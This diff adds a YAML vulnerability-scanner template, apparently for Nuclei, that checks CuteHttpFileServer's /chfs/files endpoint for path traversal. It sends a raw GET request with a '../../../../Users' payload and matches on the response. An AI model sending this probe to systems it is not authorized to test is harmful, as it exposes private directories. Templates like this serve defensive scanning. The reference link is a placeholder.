@@ -1,0 +1,27 @@
+id: cutehttpfileserver-path-traversal
+
+info:
+  name: "CuteHttpFileServer 接口路径穿越漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    CuteHttpFileServer 的 /chfs 接口存在路径穿越漏洞，攻击者可通过构造恶意请求访问非授权目录资源。
+      reference:
+        - https://example.com/cve-2025-1234
+  tags: CuteHttpFileServer
+
+http:
+- raw:
+  - |
+    GET /chfs/files?filepath=../../../../Users HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'guestMask'
